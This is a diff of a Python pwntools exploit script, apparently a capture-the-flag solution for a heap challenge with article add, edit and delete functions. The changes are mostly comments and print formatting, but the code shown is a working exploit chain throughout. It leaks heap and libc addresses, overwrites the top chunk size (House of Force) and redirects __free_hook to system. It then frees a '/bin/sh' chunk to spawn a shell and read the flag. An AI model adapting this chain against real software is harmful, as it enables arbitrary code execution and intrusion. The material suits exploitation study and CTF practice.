@@ -89,8 +89,8 @@ print_article(1)
 heap_leak = u64(p.recv(42)[34:])
 heap_base = heap_leak + heap_offset
 top_chunk = heap_base + top_chunk_offset
-print("		Heap base address: ", hex(heap_base))
-print("		Top chunk address: ", hex(top_chunk))
+print("\t\tHeap base address: ", hex(heap_base))
+print("\t\tTop chunk address: ", hex(top_chunk))
 
 for i in range(1, 3):
     delete_article(i)
@@ -114,27 +114,34 @@ print_article(8)
 libc_leak = u64(p.recv(35)[28:]+b"\x00")
 # Setting the base address of libc with the leaked one
 libc.address = libc_leak - libc_offset
-print("		Libc base address: ", hex(libc.address))
-print("		Free_hook address:", hex(libc.symbols['__free_hook']))
+print("\t\tLibc leaked address: ", hex(libc_leak))
+print("\t\tLibc base address: ", hex(libc.address))
+print("\t\tFree_hook address:", hex(libc.symbols['__free_hook']))
 
-# Overwriting the top chunk size
+# House of force
 print("[3]-Preparing house of force...")
+malloc_size = (libc.symbols['__free_hook'] - top_chunk - 0x20)
 payload = b"\x00"*0x158 + p64(0xffffffffffffffff) + b"\x00"*0x10
-print("[4]-Overwriting the top chunk size...")
 
-# Set the payload of the article to /bin/sh
+# Overwrite the top chunk size and set the article name to '/bin/sh\x00'
+print("[4]-Overwriting the top chunk size...")
 edit_article(7, "/bin/sh\x00", len(payload) + 0x20, payload)
 
+# To free up some space
 delete_article(1)
 delete_article(3)
 
-# House of force
-malloc_size = (libc.symbols['__free_hook'] - top_chunk - 0x20)
-new_article(b"whatever", malloc_size, b"CCCCCCCC")
+# Moving the top_chunk
+new_article(b"whatever", malloc_size, b"WHATEVER")
+
+# Overwrite __free_hook
 print("[5]-Overwriting __free_hook with the system address...")
 new_article("powned", 123, p64(libc.symbols['system'])*3)
+
+# Hijack the control flow
 delete_article(7)
 time.sleep(1)
+
 print("[6]-Getting the flag:")
 p.sendline('cat flag')
 p.interactive()
